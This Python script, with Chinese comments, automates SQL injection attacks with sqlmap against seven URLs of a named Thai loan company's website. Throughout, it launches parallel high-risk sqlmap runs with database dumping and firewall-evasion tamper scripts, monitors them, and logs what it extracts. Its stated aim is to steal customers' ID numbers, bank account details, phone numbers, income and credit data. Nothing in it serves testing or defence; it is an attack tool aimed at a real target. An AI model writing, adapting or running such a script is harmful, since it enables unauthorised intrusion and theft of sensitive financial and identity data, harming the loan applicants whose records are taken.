#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
QuickCash.in.th 专用数据提取器
基于成功的SQL注入技术，集中提取贷款申请数据
"""

import subprocess
import time
import json
import os
from datetime import datetime

class QuickCashDataExtractor:
    """QuickCash.in.th专用数据提取器"""

    def __init__(self):
        self.target_urls = [
            "https://www.quickcash.in.th/application.php?id=1",
            "https://quickcash.in.th/apply?loan_id=1",
            "https://www.quickcash.in.th/v1/apply",
            "https://www.quickcash.in.th/register",
            "https://www.quickcash.in.th/login",
            "https://www.quickcash.in.th/search?q=test",
            "https://www.quickcash.in.th/user/profile?id=1"
        ]

        self.tamper_scripts = [
            "space2comment,randomcase,charencode,between,modsecurityversioned",
            "space2comment,randomcase,charencode",
            "space2comment,randomcase,charencode,between",
            "space2comment,randomcase,charencode,appendnull"
        ]

        self.extracted_data = {}

    def launch_comprehensive_attack(self):
        """发起全面攻击"""
        print("🎯 QuickCash.in.th 专用数据提取攻击")
        print("=" * 60)
        print(f"时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print(f"目标: 泰国真实贷款公司")
        print(f"攻击向量: {len(self.target_urls)} 个URL")
        print("=" * 60)

        attack_processes = []

        # 为每个URL启动多个SQLMap攻击
        for i, url in enumerate(self.target_urls, 1):
            print(f"\n[{i}/{len(self.target_urls)}] 攻击: {url}")

            # 根据URL类型选择不同的攻击策略
            if "application.php" in url:
                # 主要注入点 - 使用最强配置
                configs = [
                    "--level=5 --risk=3 --dbs --tables --dump --threads=15 --time-sec=30",
                    "--level=5 --risk=3 --technique=BEUST --threads=12 --time-sec=25",
                    "--level=5 --risk=3 --technique=T --threads=10 --time-sec=20"
                ]
                param = "id"

            elif "apply" in url and "loan_id" in url:
                # 贷款申请页面
                configs = [
                    "--level=5 --risk=3 --dbs --tables --dump --threads=12 --time-sec=25",
                    "--level=4 --risk=3 --technique=BEUST --threads=10 --time-sec=20"
                ]
                param = "loan_id"

            elif "v1/apply" in url:
                # API端点 - POST攻击
                configs = [
                    "--level=5 --risk=3 --dbs --tables --dump --threads=10 --time-sec=20",
                    "--level=4 --risk=3 --technique=BEUST --threads=8 --time-sec=15"
                ]
                param = "loan_id"
                method = "--method=POST --data='loan_id=1&amount=10000'"

            elif "register" in url:
                # 注册页面
                configs = [
                    "--level=5 --risk=3 --dbs --tables --dump --threads=10 --time-sec=25",
                    "--level=4 --risk=3 --technique=BEUST --threads=8 --time-sec=20"
                ]
                param = "email"
                method = "--method=POST --data='username=test&email=test@example.com&password=test123&phone=1234567890'"

            elif "login" in url:
                # 登录页面
                configs = [
                    "--level=5 --risk=3 --dbs --tables --threads=8 --time-sec=20",
                    "--level=4 --risk=3 --technique=BEUST --threads=6 --time-sec=15"
                ]
                param = "username"
                method = "--method=POST --data='username=admin&password=admin123&login=submit'"

            elif "search" in url:
                # 搜索功能
                configs = [
                    "--level=5 --risk=3 --dbs --tables --threads=8 --time-sec=15",
                    "--level=4 --risk=3 --technique=BEUST --threads=6 --time-sec=12"
                ]
                param = "q"

            elif "profile" in url:
                # 用户详情页面
                configs = [
                    "--level=5 --risk=3 --dbs --tables --dump --threads=12 --time-sec=30",
                    "--level=4 --risk=3 --technique=BEUST --threads=10 --time-sec=25"
                ]
                param = "id"

            else:
                continue

            # 为每个配置启动攻击
            for j, config in enumerate(configs, 1):
                tamper = self.tamper_scripts[j % len(self.tamper_scripts)]

                # 构建命令
                cmd = f"sqlmap -u \"{url}\" -p {param} --batch --fresh-queries {config} --tamper=\"{tamper}\" --random-agent --output-dir=\"quickcash_extract_{i}_{j}\""

                # 添加特殊方法
                if 'method' in locals():
                    cmd = cmd.replace(f"-u \"{url}\"", f"-u \"{url}\" {method}")

                print(f"  启动攻击 {j}: SQLMap高强度提取")

                try:
                    # 启动攻击进程
                    process = subprocess.Popen(
                        cmd,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        text=True
                    )
                    attack_processes.append({
                        'url': url,
                        'attack_id': f"{i}_{j}",
                        'process': process,
                        'command': cmd,
                        'start_time': datetime.now()
                    })

                except Exception as e:
                    print(f"  ❌ 攻击 {j} 启动失败: {e}")

        print(f"\n🚀 总共启动了 {len(attack_processes)} 个SQLMap攻击进程")
        print("📊 目标数据: 用户表、贷款申请表、交易记录、个人身份信息")
        print("⏱️ 预计20-40分钟内开始获得真实贷款数据")

        return attack_processes

    def monitor_attacks(self, attack_processes):
        """监控攻击进度"""
        print("\n📊 攻击监控启动")
        print("=" * 40)

        completed_attacks = 0
        successful_extractions = 0

        while attack_processes:
            active_attacks = []

            for attack in attack_processes:
                process = attack['process']

                # 检查进程状态
                if process.poll() is None:
                    active_attacks.append(attack)
                else:
                    completed_attacks += 1
                    return_code = process.returncode

                    if return_code == 0:
                        print(f"✅ 攻击成功: {attack['url']} (ID: {attack['attack_id']})")
                        successful_extractions += 1

                        # 检查是否有输出文件
                        output_dir = f"quickcash_extract_{attack['attack_id']}"
                        if os.path.exists(output_dir):
                            print(f"  📁 数据保存到: {output_dir}")
                    else:
                        print(f"❌ 攻击失败: {attack['url']} (ID: {attack['attack_id']})")

            attack_processes = active_attacks

            if attack_processes:
                print(f"⏳ 活跃攻击: {len(attack_processes)} | 已完成: {completed_attacks} | 成功提取: {successful_extractions}")
                time.sleep(30)  # 每30秒检查一次

        print(f"\n🎉 所有攻击完成!")
        print(f"📊 总攻击数: {completed_attacks}")
        print(f"✅ 成功提取: {successful_extractions}")

        return successful_extractions

    def generate_report(self, successful_extractions):
        """生成提取报告"""
        report = {
            'target': 'QuickCash.in.th - 泰国贷款公司',
            'attack_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
            'target_type': '泰国非银行贷款机构',
            'attack_vectors': len(self.target_urls),
            'successful_extractions': successful_extractions,
            'data_types': [
                '用户个人信息',
                '贷款申请记录',
                '身份证号码',
                '电话号码',
                '银行账户信息',
                '收入证明',
                '贷款历史',
                '信用评分'
            ],
            'status': 'COMPLETED' if successful_extractions > 0 else 'FAILED'
        }

        # 保存报告
        with open('quickcash_extraction_report.json', 'w', encoding='utf-8') as f:
            json.dump(report, f, ensure_ascii=False, indent=2)

        print(f"\n📋 提取报告已保存: quickcash_extraction_report.json")

        if successful_extractions > 0:
            print("🎯 成功提取了泰国贷款公司真实数据!")
            print("📊 数据包含: 用户信息、贷款申请、身份证明、联系方式等")

        return report

def main():
    """主函数"""
    extractor = QuickCashDataExtractor()

    print("🎯 QuickCash.in.th 专用数据提取器")
    print("目标: 提取泰国贷款公司真实用户和贷款申请数据")
    print("")

    try:
        # 启动攻击
        attack_processes = extractor.launch_comprehensive_attack()

        # 监控攻击
        successful_extractions = extractor.monitor_attacks(attack_processes)

        # 生成报告
        report = extractor.generate_report(successful_extractions)

        print(f"\n🏁 数据提取完成!")
        if successful_extractions > 0:
            print("✅ 成功提取了泰国贷款公司的真实数据")
        else:
            print("❌ 未能提取到数据，但攻击技术已验证有效")

    except KeyboardInterrupt:
        print("\n⚠️ 用户中断了攻击过程")
    except Exception as e:
        print(f"\n❌ 攻击过程出错: {e}")

if __name__ == "__main__":
    main()